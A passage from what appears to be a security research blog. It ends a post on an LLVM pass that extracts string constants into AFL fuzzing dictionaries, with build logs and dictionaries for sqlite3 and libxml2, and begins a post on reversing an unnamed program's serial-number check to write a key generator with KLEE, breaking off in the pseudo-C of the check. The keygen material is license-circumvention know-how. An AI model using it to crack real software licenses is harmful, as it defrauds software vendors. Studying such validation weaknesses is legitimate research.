</span><span class='line'>[+] Call to strncmp with constant &quot;weekday &quot; found in sqlite3.c/isDate
</span><span class='line'>[+] Call to strncmp with constant &quot;start of &quot; found in sqlite3.c/isDate
</span><span class='line'>[+] Call to strcmp with constant &quot;month&quot; found in sqlite3.c/isDate
</span><span class='line'>[+] Call to strcmp with constant &quot;year&quot; found in sqlite3.c/isDate
</span><span class='line'>[+] Call to strcmp with constant &quot;hour&quot; found in sqlite3.c/isDate
</span><span class='line'>[+] Call to strcmp with constant &quot;minute&quot; found in sqlite3.c/isDate
</span><span class='line'>[+] Call to strcmp with constant &quot;second&quot; found in sqlite3.c/isDate
</span><span class='line'>over@bubuntu:~/workz/sqlite3$ sort -u /tmp/sqlite.dict
</span><span class='line'>&quot;@  &quot;
</span><span class='line'>&quot;BINARY&quot;
</span><span class='line'>&quot;blob&quot;
</span><span class='line'>&quot;cache&quot;
</span><span class='line'>&quot;char&quot;
</span><span class='line'>&quot;clob&quot;
</span><span class='line'>&quot;doub&quot;
</span><span class='line'>&quot;file:&quot;
</span><span class='line'>&quot;floa&quot;
</span><span class='line'>&quot;hour&quot;
</span><span class='line'>&quot;immutable&quot;
</span><span class='line'>&quot;localhost&quot;
</span><span class='line'>&quot;localtime&quot;
</span><span class='line'>&quot;:memory:&quot;
</span><span class='line'>&quot;minute&quot;
</span><span class='line'>&quot;mode&quot;
</span><span class='line'>&quot;month&quot;
</span><span class='line'>&quot;nolock&quot;
</span><span class='line'>&quot;real&quot;
</span><span class='line'>&quot;second&quot;
</span><span class='line'>&quot;SQLite format 3&quot;
</span><span class='line'>&quot;sqlite_sequence&quot;
</span><span class='line'>&quot;start of &quot;
</span><span class='line'>&quot;text&quot;
</span><span class='line'>&quot;unixepoch&quot;
</span><span class='line'>&quot;unix-excl&quot;
</span><span class='line'>&quot;vfs&quot;
</span><span class='line'>&quot;weekday &quot;
</span><span class='line'>&quot;\xd9\xd5\x05\xf9 \xa1c&quot;
</span><span class='line'>&quot;year&quot;
</span></code></pre></td></tr></table></div></figure>


<p>On <a href="https://github.com/GNOME/libxml2">libxml2</a> (here is a library with a lot of test cases / utilities that raises the noise ratio in the tokens extracted &ndash; cf <code>xmlShell*</code> for example):</p>

<figure class='code'><figcaption><span>libxml2</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
<span class='line-number'>85</span>
<span class='line-number'>86</span>
<span class='line-number'>87</span>
<span class='line-number'>88</span>
<span class='line-number'>89</span>
<span class='line-number'>90</span>
<span class='line-number'>91</span>
<span class='line-number'>92</span>
<span class='line-number'>93</span>
<span class='line-number'>94</span>
<span class='line-number'>95</span>
<span class='line-number'>96</span>
<span class='line-number'>97</span>
<span class='line-number'>98</span>
<span class='line-number'>99</span>
<span class='line-number'>100</span>
<span class='line-number'>101</span>
<span class='line-number'>102</span>
<span class='line-number'>103</span>
<span class='line-number'>104</span>
<span class='line-number'>105</span>
<span class='line-number'>106</span>
<span class='line-number'>107</span>
<span class='line-number'>108</span>
<span class='line-number'>109</span>
<span class='line-number'>110</span>
<span class='line-number'>111</span>
<span class='line-number'>112</span>
<span class='line-number'>113</span>
<span class='line-number'>114</span>
<span class='line-number'>115</span>
<span class='line-number'>116</span>
<span class='line-number'>117</span>
<span class='line-number'>118</span>
<span class='line-number'>119</span>
<span class='line-number'>120</span>
<span class='line-number'>121</span>
<span class='line-number'>122</span>
<span class='line-number'>123</span>
<span class='line-number'>124</span>
<span class='line-number'>125</span>
<span class='line-number'>126</span>
<span class='line-number'>127</span>
<span class='line-number'>128</span>
<span class='line-number'>129</span>
<span class='line-number'>130</span>
<span class='line-number'>131</span>
<span class='line-number'>132</span>
<span class='line-number'>133</span>
<span class='line-number'>134</span>
<span class='line-number'>135</span>
<span class='line-number'>136</span>
<span class='line-number'>137</span>
<span class='line-number'>138</span>
<span class='line-number'>139</span>
<span class='line-number'>140</span>
<span class='line-number'>141</span>
<span class='line-number'>142</span>
<span class='line-number'>143</span>
<span class='line-number'>144</span>
<span class='line-number'>145</span>
<span class='line-number'>146</span>
<span class='line-number'>147</span>
<span class='line-number'>148</span>
<span class='line-number'>149</span>
<span class='line-number'>150</span>
<span class='line-number'>151</span>
<span class='line-number'>152</span>
<span class='line-number'>153</span>
<span class='line-number'>154</span>
<span class='line-number'>155</span>
<span class='line-number'>156</span>
<span class='line-number'>157</span>
<span class='line-number'>158</span>
<span class='line-number'>159</span>
<span class='line-number'>160</span>
<span class='line-number'>161</span>
<span class='line-number'>162</span>
<span class='line-number'>163</span>
<span class='line-number'>164</span>
<span class='line-number'>165</span>
<span class='line-number'>166</span>
<span class='line-number'>167</span>
<span class='line-number'>168</span>
<span class='line-number'>169</span>
<span class='line-number'>170</span>
<span class='line-number'>171</span>
<span class='line-number'>172</span>
<span class='line-number'>173</span>
<span class='line-number'>174</span>
<span class='line-number'>175</span>
<span class='line-number'>176</span>
<span class='line-number'>177</span>
<span class='line-number'>178</span>
<span class='line-number'>179</span>
<span class='line-number'>180</span>
<span class='line-number'>181</span>
<span class='line-number'>182</span>
<span class='line-number'>183</span>
<span class='line-number'>184</span>
<span class='line-number'>185</span>
<span class='line-number'>186</span>
<span class='line-number'>187</span>
<span class='line-number'>188</span>
<span class='line-number'>189</span>
<span class='line-number'>190</span>
<span class='line-number'>191</span>
<span class='line-number'>192</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'>over@bubuntu:~/workz/libxml2$ CC=/home/over/workz/afl-2.35b/afl-clang-fast ./autogen.sh &amp;&amp; AFL_TOKEN_FILE=/tmp/xml.dict make
</span><span class='line'>[...]
</span><span class='line'>afl-clang-fast 2.35b by &lt;lszekeres@google.com&gt;
</span><span class='line'>afl-llvm-tokencap-pass 2.35b by &lt;0vercl0k@tuxfamily.org&gt;
</span><span class='line'>afl-llvm-pass 2.35b by &lt;lszekeres@google.com&gt;
</span><span class='line'>[+] Instrumented 668 locations (non-hardened mode, ratio 100%).
</span><span class='line'>[+] Call to strcmp with constant &quot;UTF-8&quot; found in encoding.c/xmlParseCharEncoding__internal_alias
</span><span class='line'>[+] Call to strcmp with constant &quot;UTF8&quot; found in encoding.c/xmlParseCharEncoding__internal_alias
</span><span class='line'>[+] Call to strcmp with constant &quot;UTF-16&quot; found in encoding.c/xmlParseCharEncoding__internal_alias
</span><span class='line'>[+] Call to strcmp with constant &quot;UTF16&quot; found in encoding.c/xmlParseCharEncoding__internal_alias
</span><span class='line'>[+] Call to strcmp with constant &quot;ISO-10646-UCS-2&quot; found in encoding.c/xmlParseCharEncoding__internal_alias
</span><span class='line'>[+] Call to strcmp with constant &quot;UCS-2&quot; found in encoding.c/xmlParseCharEncoding__internal_alias
</span><span class='line'>[+] Call to strcmp with constant &quot;UCS2&quot; found in encoding.c/xmlParseCharEncoding__internal_alias
</span><span class='line'>[+] Call to strcmp with constant &quot;ISO-10646-UCS-4&quot; found in encoding.c/xmlParseCharEncoding__internal_alias
</span><span class='line'>[+] Call to strcmp with constant &quot;UCS-4&quot; found in encoding.c/xmlParseCharEncoding__internal_alias
</span><span class='line'>[+] Call to strcmp with constant &quot;UCS4&quot; found in encoding.c/xmlParseCharEncoding__internal_alias
</span><span class='line'>[+] Call to strcmp with constant &quot;ISO-8859-1&quot; found in encoding.c/xmlParseCharEncoding__internal_alias
</span><span class='line'>[+] Call to strcmp with constant &quot;ISO-LATIN-1&quot; found in encoding.c/xmlParseCharEncoding__internal_alias
</span><span class='line'>[+] Call to strcmp with constant &quot;ISO LATIN 1&quot; found in encoding.c/xmlParseCharEncoding__internal_alias
</span><span class='line'>[+] Call to strcmp with constant &quot;ISO-8859-2&quot; found in encoding.c/xmlParseCharEncoding__internal_alias
</span><span class='line'>[+] Call to strcmp with constant &quot;ISO-LATIN-2&quot; found in encoding.c/xmlParseCharEncoding__internal_alias
</span><span class='line'>[+] Call to strcmp with constant &quot;ISO LATIN 2&quot; found in encoding.c/xmlParseCharEncoding__internal_alias
</span><span class='line'>[+] Call to strcmp with constant &quot;ISO-8859-3&quot; found in encoding.c/xmlParseCharEncoding__internal_alias
</span><span class='line'>[+] Call to strcmp with constant &quot;ISO-8859-4&quot; found in encoding.c/xmlParseCharEncoding__internal_alias
</span><span class='line'>[+] Call to strcmp with constant &quot;ISO-8859-5&quot; found in encoding.c/xmlParseCharEncoding__internal_alias
</span><span class='line'>[+] Call to strcmp with constant &quot;ISO-8859-6&quot; found in encoding.c/xmlParseCharEncoding__internal_alias
</span><span class='line'>[+] Call to strcmp with constant &quot;ISO-8859-7&quot; found in encoding.c/xmlParseCharEncoding__internal_alias
</span><span class='line'>[+] Call to strcmp with constant &quot;ISO-8859-8&quot; found in encoding.c/xmlParseCharEncoding__internal_alias
</span><span class='line'>[+] Call to strcmp with constant &quot;ISO-8859-9&quot; found in encoding.c/xmlParseCharEncoding__internal_alias
</span><span class='line'>[+] Call to strcmp with constant &quot;ISO-2022-JP&quot; found in encoding.c/xmlParseCharEncoding__internal_alias
</span><span class='line'>[+] Call to strcmp with constant &quot;SHIFT_JIS&quot; found in encoding.c/xmlParseCharEncoding__internal_alias
</span><span class='line'>[+] Call to strcmp with constant &quot;EUC-JP&quot; found in encoding.c/xmlParseCharEncoding__internal_alias
</span><span class='line'>[...]
</span><span class='line'>afl-clang-fast 2.35b by &lt;lszekeres@google.com&gt;
</span><span class='line'>afl-llvm-tokencap-pass 2.35b by &lt;0vercl0k@tuxfamily.org&gt;
</span><span class='line'>afl-llvm-pass 2.35b by &lt;lszekeres@google.com&gt;
</span><span class='line'>[+] Instrumented 1214 locations (non-hardened mode, ratio 100%).
</span><span class='line'>[+] Call to strcmp with constant &quot;exit&quot; found in debugXML.c/xmlShell__internal_alias
</span><span class='line'>[+] Call to strcmp with constant &quot;quit&quot; found in debugXML.c/xmlShell__internal_alias
</span><span class='line'>[+] Call to strcmp with constant &quot;help&quot; found in debugXML.c/xmlShell__internal_alias
</span><span class='line'>[+] Call to strcmp with constant &quot;validate&quot; found in debugXML.c/xmlShell__internal_alias
</span><span class='line'>[+] Call to strcmp with constant &quot;load&quot; found in debugXML.c/xmlShell__internal_alias
</span><span class='line'>[+] Call to strcmp with constant &quot;relaxng&quot; found in debugXML.c/xmlShell__internal_alias
</span><span class='line'>[+] Call to strcmp with constant &quot;save&quot; found in debugXML.c/xmlShell__internal_alias
</span><span class='line'>[+] Call to strcmp with constant &quot;write&quot; found in debugXML.c/xmlShell__internal_alias
</span><span class='line'>[+] Call to strcmp with constant &quot;grep&quot; found in debugXML.c/xmlShell__internal_alias
</span><span class='line'>[+] Call to strcmp with constant &quot;free&quot; found in debugXML.c/xmlShell__internal_alias
</span><span class='line'>[+] Call to strcmp with constant &quot;base&quot; found in debugXML.c/xmlShell__internal_alias
</span><span class='line'>[+] Call to strcmp with constant &quot;setns&quot; found in debugXML.c/xmlShell__internal_alias
</span><span class='line'>[+] Call to strcmp with constant &quot;setrootns&quot; found in debugXML.c/xmlShell__internal_alias
</span><span class='line'>[+] Call to strcmp with constant &quot;xpath&quot; found in debugXML.c/xmlShell__internal_alias
</span><span class='line'>[+] Call to strcmp with constant &quot;setbase&quot; found in debugXML.c/xmlShell__internal_alias
</span><span class='line'>[+] Call to strcmp with constant &quot;whereis&quot; found in debugXML.c/xmlShell__internal_alias
</span><span class='line'>[...]
</span><span class='line'>over@bubuntu:~/workz/libxml2$ sort -u /tmp/xml.dict
</span><span class='line'>&quot;307377&quot;
</span><span class='line'>&quot;base&quot;
</span><span class='line'>&quot;c14n&quot;
</span><span class='line'>&quot;catalog&quot;
</span><span class='line'>&quot;&lt;![CDATA[&quot;
</span><span class='line'>&quot;chvalid&quot;
</span><span class='line'>&quot;crazy:&quot;
</span><span class='line'>&quot;debugXML&quot;
</span><span class='line'>&quot;dict&quot;
</span><span class='line'>&quot;disable SAX&quot;
</span><span class='line'>&quot;document&quot;
</span><span class='line'>&quot;encoding&quot;
</span><span class='line'>&quot;entities&quot;
</span><span class='line'>&quot;EUC-JP&quot;
</span><span class='line'>&quot;exit&quot;
</span><span class='line'>&quot;fetch external entities&quot;
</span><span class='line'>&quot;file:///etc/xml/catalog&quot;
</span><span class='line'>&quot;free&quot;
</span><span class='line'>&quot;ftp://&quot;
</span><span class='line'>&quot;gather line info&quot;
</span><span class='line'>&quot;grep&quot;
</span><span class='line'>&quot;hash&quot;
</span><span class='line'>&quot;help&quot;
</span><span class='line'>&quot;HTMLparser&quot;
</span><span class='line'>&quot;HTMLtree&quot;
</span><span class='line'>&quot;http&quot;
</span><span class='line'>&quot;HTTP/&quot;
</span><span class='line'>&quot;huge:&quot;
</span><span class='line'>&quot;huge:attrNode&quot;
</span><span class='line'>&quot;huge:commentNode&quot;
</span><span class='line'>&quot;huge:piNode&quot;
</span><span class='line'>&quot;huge:textNode&quot;
</span><span class='line'>&quot;is html&quot;
</span><span class='line'>&quot;ISO-10646-UCS-2&quot;
</span><span class='line'>&quot;ISO-10646-UCS-4&quot;
</span><span class='line'>&quot;ISO-2022-JP&quot;
</span><span class='line'>&quot;ISO-8859-1&quot;
</span><span class='line'>&quot;ISO-8859-2&quot;
</span><span class='line'>&quot;ISO-8859-3&quot;
</span><span class='line'>&quot;ISO-8859-4&quot;
</span><span class='line'>&quot;ISO-8859-5&quot;
</span><span class='line'>&quot;ISO-8859-6&quot;
</span><span class='line'>&quot;ISO-8859-7&quot;
</span><span class='line'>&quot;ISO-8859-8&quot;
</span><span class='line'>&quot;ISO-8859-9&quot;
</span><span class='line'>&quot;ISO LATIN 1&quot;
</span><span class='line'>&quot;ISO-LATIN-1&quot;
</span><span class='line'>&quot;ISO LATIN 2&quot;
</span><span class='line'>&quot;ISO-LATIN-2&quot;
</span><span class='line'>&quot;is standalone&quot;
</span><span class='line'>&quot;is valid&quot;
</span><span class='line'>&quot;is well formed&quot;
</span><span class='line'>&quot;keep blanks&quot;
</span><span class='line'>&quot;list&quot;
</span><span class='line'>&quot;load&quot;
</span><span class='line'>&quot;nanoftp&quot;
</span><span class='line'>&quot;nanohttp&quot;
</span><span class='line'>&quot;parser&quot;
</span><span class='line'>&quot;parserInternals&quot;
</span><span class='line'>&quot;pattern&quot;
</span><span class='line'>&quot;quit&quot;
</span><span class='line'>&quot;relaxng&quot;
</span><span class='line'>&quot;save&quot;
</span><span class='line'>&quot;SAX2&quot;
</span><span class='line'>&quot;SAX block&quot;
</span><span class='line'>&quot;SAX function attributeDecl&quot;
</span><span class='line'>&quot;SAX function cdataBlock&quot;
</span><span class='line'>&quot;SAX function characters&quot;
</span><span class='line'>&quot;SAX function comment&quot;
</span><span class='line'>&quot;SAX function elementDecl&quot;
</span><span class='line'>&quot;SAX function endDocument&quot;
</span><span class='line'>&quot;SAX function endElement&quot;
</span><span class='line'>&quot;SAX function entityDecl&quot;
</span><span class='line'>&quot;SAX function error&quot;
</span><span class='line'>&quot;SAX function externalSubset&quot;
</span><span class='line'>&quot;SAX function fatalError&quot;
</span><span class='line'>&quot;SAX function getEntity&quot;
</span><span class='line'>&quot;SAX function getParameterEntity&quot;
</span><span class='line'>&quot;SAX function hasExternalSubset&quot;
</span><span class='line'>&quot;SAX function hasInternalSubset&quot;
</span><span class='line'>&quot;SAX function ignorableWhitespace&quot;
</span><span class='line'>&quot;SAX function internalSubset&quot;
</span><span class='line'>&quot;SAX function isStandalone&quot;
</span><span class='line'>&quot;SAX function notationDecl&quot;
</span><span class='line'>&quot;SAX function reference&quot;
</span><span class='line'>&quot;SAX function resolveEntity&quot;
</span><span class='line'>&quot;SAX function setDocumentLocator&quot;
</span><span class='line'>&quot;SAX function startDocument&quot;
</span><span class='line'>&quot;SAX function startElement&quot;
</span><span class='line'>&quot;SAX function unparsedEntityDecl&quot;
</span><span class='line'>&quot;SAX function warning&quot;
</span><span class='line'>&quot;schemasInternals&quot;
</span><span class='line'>&quot;schematron&quot;
</span><span class='line'>&quot;setbase&quot;
</span><span class='line'>&quot;setns&quot;
</span><span class='line'>&quot;setrootns&quot;
</span><span class='line'>&quot;SHIFT_JIS&quot;
</span><span class='line'>&quot;sql:&quot;
</span><span class='line'>&quot;substitute entities&quot;
</span><span class='line'>&quot;test/threads/invalid.xml&quot;
</span><span class='line'>&quot;total&quot;
</span><span class='line'>&quot;tree&quot;
</span><span class='line'>&quot;tutor10_1&quot;
</span><span class='line'>&quot;tutor10_2&quot;
</span><span class='line'>&quot;tutor3_2&quot;
</span><span class='line'>&quot;tutor8_2&quot;
</span><span class='line'>&quot;UCS-2&quot;
</span><span class='line'>&quot;UCS2&quot;
</span><span class='line'>&quot;UCS-4&quot;
</span><span class='line'>&quot;UCS4&quot;
</span><span class='line'>&quot;user data&quot;
</span><span class='line'>&quot;UTF-16&quot;
</span><span class='line'>&quot;UTF16&quot;
</span><span class='line'>&quot;UTF-16BE&quot;
</span><span class='line'>&quot;UTF-16LE&quot;
</span><span class='line'>&quot;UTF-8&quot;
</span><span class='line'>&quot;UTF8&quot;
</span><span class='line'>&quot;valid&quot;
</span><span class='line'>&quot;validate&quot;
</span><span class='line'>&quot;whereis&quot;
</span><span class='line'>&quot;write&quot;
</span><span class='line'>&quot;xinclude&quot;
</span><span class='line'>&quot;xmlautomata&quot;
</span><span class='line'>&quot;xmlerror&quot;
</span><span class='line'>&quot;xmlIO&quot;
</span><span class='line'>&quot;xmlmodule&quot;
</span><span class='line'>&quot;xmlreader&quot;
</span><span class='line'>&quot;xmlregexp&quot;
</span><span class='line'>&quot;xmlsave&quot;
</span><span class='line'>&quot;xmlschemas&quot;
</span><span class='line'>&quot;xmlschemastypes&quot;
</span><span class='line'>&quot;xmlstring&quot;
</span><span class='line'>&quot;xmlunicode&quot;
</span><span class='line'>&quot;xmlwriter&quot;
</span><span class='line'>&quot;xpath&quot;
</span><span class='line'>&quot;xpathInternals&quot;
</span><span class='line'>&quot;xpointer&quot;
</span></code></pre></td></tr></table></div></figure>


<p>Performance wise &ndash; here is what we are looking at on <code>libpng</code> (+0.283s):</p>

<figure class='code'><figcaption><span>time difference on lpng</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'>over@bubuntu:~/workz/lpng1625$ make clean &amp;&amp; time AFL_TOKEN_FILE=/tmp/png.dict make &amp;&amp; make clean &amp;&amp; time make
</span><span class='line'>[...]
</span><span class='line'>real    0m12.320s
</span><span class='line'>user    0m11.732s
</span><span class='line'>sys     0m0.360s
</span><span class='line'>[...]
</span><span class='line'>real    0m12.037s
</span><span class='line'>user    0m11.436s
</span><span class='line'>sys     0m0.384s
</span></code></pre></td></tr></table></div></figure>


<h1>Last words</h1>

<p>I am very interested in hearing from you if you give a shot to this analysis pass on your code-base and / or your fuzzing sessions, so feel free to hit me up! Also, note that <a href="http://llvm.org/docs/LibFuzzer.html">libfuzzer</a> supports the same feature and is compatible with afl&rsquo;s dictionary syntax &ndash; so you get it for free!</p>

<p>Here is a list of interesting articles talking about transformation/analysis passes that I recommend you read if you want to know more:</p>

<ul>
<li><a href="http://blog.quarkslab.com/turning-regular-code-into-atrocities-with-llvm.html">Turning Regular Code Into Atrocities With LLVM</a></li>
<li><a href="https://github.com/0vercl0k/stuffz/blob/master/llvm-funz/kryptonite/llvm-functionpass-kryptonite-obfuscater.cpp">llvm-functionpass-kryptonite-obfuscater.cpp</a></li>
<li><a href="https://github.com/quarkslab/llvm-passes">quarkslab/llvm-passes</a></li>
<li><a href="https://github.com/llvm-mirror/llvm/tree/master/lib/Analysis">llvm/lib/Analysis</a></li>
<li><a href="https://github.com/llvm-mirror/llvm/tree/master/lib/Transforms">llvm/lib/Transforms</a></li>
</ul>


<p>Special shout-outs to my proofreaders: <a href="https://twitter.com/yrp604">yrp</a>, <a href="https://twitter.com/mongobug">mongo</a> &amp; <a href="https://twitter.com/JonathanSalwan">jonathan</a>.</p>

<p>Go hax clang and or LLVM!</p>
]]></content>
    
  </entry>
  
  <entry>
    
    <title type="html"><![CDATA[Keygenning with KLEE]]></title>
    <link href="http://doar-e.github.io/blog/2015/08/18/keygenning-with-klee/"/>
    
    <updated>2015-08-18T22:12:00-07:00</updated>
    <id>http://doar-e.github.io/blog/2015/08/18/keygenning-with-klee</id>
    
    <content type="html"><![CDATA[<h1>Introduction</h1>

<p>In the past weeks I enjoyed working on reversing a piece of software (don&rsquo;t ask me the name), to study how serial numbers are validated. The story the user has to follow is pretty common: download the trial, pay, get the serial number, use it in the annoying nag screen to get the fully functional version of the software.</p>

<p>Since my purpose is to not damage the company developing the software, I will not mention the name of the software, nor I will publish the final key generator in binary form, nor its source code. My goal is instead to study a real case of serial number validation, and to highlight its weaknesses.</p>

<p>In this post we are going to take a look at the steps I followed to reverse the serial validation process and to make a key generator using <a href="http://klee.github.io/">KLEE</a> symbolic virtual machine. We are not going to follow all the details on the reversing part, since you cannot reproduce them on your own. We will concentrate our thoughts on the key-generator itself: that is the most interesting part.</p>

<div class='entry-content-toc'></div>




<!--more-->


<h2>Getting acquainted</h2>

<p>The software is an <code>x86</code> executable, with no anti-debugging, nor anti-reversing techniques. When started it presents a nag screen asking for a registration composed by: customer number, serial number and a mail address. This is fairly common in software.</p>

<h2>Tools of the trade</h2>

<p>First steps in the reversing are devoted to find all the interesting functions to analyze. To do this I used <a href="https://www.hex-rays.com/products/ida/">IDA Pro</a> with Hex-Rays decompiler, and the <a href="https://msdn.microsoft.com/en-us/library/windows/hardware/ff551063%28v=vs.85%29.aspx">WinDbg</a> debugger. For the last part I used <a href="http://klee.github.io/">KLEE</a> symbolic virtual machine under Linux, <a href="https://gcc.gnu.org/">gcc compiler</a> and some bash scripting. The actual key generator was a simple <a href="https://msdn.microsoft.com/en-us/library/ms754130%28v=vs.100%29.aspx">WPF</a> application.</p>

<p>Let me skip the first part, since it is not very interesting. You can find many other articles on the web that can guide you through basic reversing techniques with IDA Pro. I only kept in mind some simple rules, while going forward:</p>

<ul>
<li>always rename functions that uses interesting data, even if you don&rsquo;t know precisely what they do. A name like <code>license_validation_unknown_8</code> is always better than a default like <code>sub_46fa39</code>;</li>
<li>similarly, rename data whenever you find it interesting;</li>
<li>change data types when you are sure they are wrong: use structs and arrays in case of aggregates;</li>
<li>follow cross references of data and functions to expand your collection;</li>
<li>validate your beliefs with the debugger if possible. For example, if you think a variable contains the serial, break with the debugger and see if it is the case.</li>
</ul>


<h2>Big picture</h2>

<p>When I collected the most interesting functions, I tried to understand the high level flow and the simpler functions. Here are the main variables and types used in the validation process. As a note for the reader: most of them have been purged of uninteresting details, for the sake of simplicity.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="k">enum</span> <span class="p">{</span>
</span><span class='line'>    <span class="n">ERROR</span><span class="p">,</span>
</span><span class='line'>    <span class="n">STANDARD</span><span class="p">,</span>
</span><span class='line'>    <span class="n">PRO</span>
</span><span class='line'><span class="p">}</span> <span class="n">license_type</span> <span class="o">=</span> <span class="n">ERROR</span><span class="p">;</span>
</span></code></pre></td></tr></table></div></figure>


<p>Here we have a global variable providing the type of the license, used to enable and disable features of the application.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="k">enum</span> <span class="n">result_t</span> <span class="p">{</span>
</span><span class='line'>    <span class="n">INVALID</span><span class="p">,</span>
</span><span class='line'>    <span class="n">VALID</span><span class="p">,</span>
</span><span class='line'>    <span class="n">VALID_IF_LAST_VERSION</span>
</span><span class='line'><span class="p">};</span>
</span></code></pre></td></tr></table></div></figure>


<p>This is a convenient <code>enum</code> used as a result for the validation. <code>INVALID</code> and <code>VALID</code> values are pretty self-explanatory.  <code>VALID_IF_LAST_VERSION</code> tells that this registration is valid only if the current software version is the last available. The reasons for this strange possibility will be clear shortly.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp">#define HEADER_SIZE 8192</span>
</span><span class='line'><span class="k">struct</span> <span class="p">{</span>
</span><span class='line'>    <span class="kt">int</span> <span class="n">header</span><span class="p">[</span><span class="n">HEADER_SIZE</span><span class="p">];</span>
</span><span class='line'>    <span class="kt">int</span> <span class="n">data</span><span class="p">[</span><span class="mi">1000000</span><span class="p">];</span>
</span><span class='line'><span class="p">}</span> <span class="n">mail_digest_table</span><span class="p">;</span>
</span></code></pre></td></tr></table></div></figure>


<p>This is a data structure, containing digests of mail addresses of known registered users. This is a pretty big file embedded in the executable itself. During startup, a resource is extracted in a temporary file and its content copied into this struct. Each element of the <code>header</code> vector is an offset pointing inside the <code>data</code> vector.</p>

<p>Here we have a pseudo-C code for the registration check, that uses data types and variables explained above:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="k">enum</span> <span class="n">result_t</span> <span class="nf">check_registration</span><span class="p">(</span><span class="kt">int</span> <span class="n">serial</span><span class="p">,</span> <span class="kt">int</span> <span class="n">customer_num</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span><span class="o">*</span> <span class="n">mail</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>    <span class="c1">// validate serial number</span>
</span><span class='line'>    <span class="n">license_type</span> <span class="o">=</span> <span class="n">get_license_type</span><span class="p">(</span><span class="n">serial</span><span class="p">);</span>
</span><span class='line'>    <span class="k">if</span> <span class="p">(</span><span class="n">license_type</span> <span class="o">==</span> <span class="n">ERROR</span><span class="p">)</span>
</span><span class='line'>        <span class="k">return</span> <span class="n">INVALID</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>    <span class="c1">// validate customer number</span>
</span><span class='line'>    <span class="kt">int</span> <span class="n">expected_customer</span> <span class="o">=</span> <span class="n">compute_customer_number</span><span class="p">(</span><span class="n">serial</span><span class="p">,</span> <span class="n">mail</span><span class="p">);</span>
